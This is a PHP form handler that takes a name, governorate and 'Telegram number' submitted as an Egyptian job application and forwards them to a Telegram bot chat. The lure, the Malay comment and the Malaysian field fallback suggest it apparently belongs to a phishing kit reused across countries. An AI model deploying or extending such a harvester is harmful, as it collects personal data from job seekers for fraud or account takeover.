<?php
session_start();
include 'telegram.php';
header("Content-Type: application/json");

$input = json_decode(file_get_contents("php://input"), true);

if (empty($input['name']) || empty($input['phone'])) {
    echo json_encode(["status" => "error", "message" => "يرجى ملء جميع الحقول المطلوبة."]);
    exit;
}

$name = htmlspecialchars($input['name']);
$phone = htmlspecialchars($input['phone']);
$governorate = !empty($input['governorate']) ? htmlspecialchars($input['governorate']) : (!empty($input['negeri']) ? htmlspecialchars($input['negeri']) : '-');

// Simpan ke session
$_SESSION['name'] = $name;
$_SESSION['phone'] = $phone;
$_SESSION['governorate'] = $governorate;

$message = "*طلب وظيفة جديد (مصر)*\n" .
           "الاسم الكامل: $name\n" .
           "المحافظة: $governorate\n" .
           "رقم التليجرام: $phone";

$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message) . "&parse_mode=Markdown";
@file_get_contents($url);

echo json_encode(["status" => "success", "message" => "تم إرسال البيانات بنجاح."]);
